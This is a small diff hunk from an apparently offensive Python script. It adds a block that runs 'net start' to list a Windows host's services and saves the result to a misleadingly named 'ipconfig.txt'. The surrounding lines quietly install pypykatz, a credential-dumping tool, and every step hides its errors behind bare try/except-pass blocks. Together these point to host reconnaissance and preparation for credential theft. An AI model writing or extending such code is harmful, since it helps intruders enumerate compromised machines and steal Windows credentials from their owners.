@@ -39,6 +39,12 @@ try:
 except:
     pass
 try:
+    ipconfig=subprocess.check_output("net start",shell=True)
+    with open("ipconfig.txt", 'wb') as file:
+        file.write(ipconfig)
+except:
+    pass
+try:
     os.system("pip3 install pypykatz")
 except:
     pass
